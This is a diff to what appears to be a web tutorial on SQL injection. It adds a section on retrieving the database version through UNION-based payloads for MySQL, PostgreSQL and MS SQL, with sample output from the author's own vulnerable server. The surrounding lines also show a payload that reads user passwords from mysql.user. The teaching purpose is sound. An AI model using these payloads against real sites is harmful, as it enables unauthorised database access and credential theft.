@@ -192,6 +192,33 @@ UNION SELECT NULL, NULL, NULL --</pre>
 
 <pre class="lang-sql default-code-style dark-mode-background">
 1' UNION SELECT User, Password FROM mysql.user -- </pre>
+
+      <h1 class="title toc">Get the database version</h1>
+      <p>
+        Suppose we have found a union vulnerability whose vulnerable select
+        statement selects two columns. We can now craft a payload to get the
+        database version.
+      </p>
+
+<pre class="lang-sql default-code-style dark-mode-background">
+# For MySQL and PostgreSQL
+' UNION SELECT version(), 'a' -- 
+
+# For MS SQL
+' UNION SELECT @@version, 'a' -- 
+</pre>
+
+      <p>
+        The <span class="inline-code">'a'</span> is dummy data because the number
+        of columns have to match the original select statement when using a union
+        statement (in our case, the number of columns in the vulnerable select
+        statement is two). The first payload returns the following on my home server
+        that I am running a vulnerable website on.
+      </p>
+
+<pre class="lang-sql default-code-style dark-mode-background">  
+10.3.34-MariaDB-0+deb10u1   a</pre>
+
     </div>
 
     <?php include SHARED_PATH . 'tutorial_navigation.php'; ?>
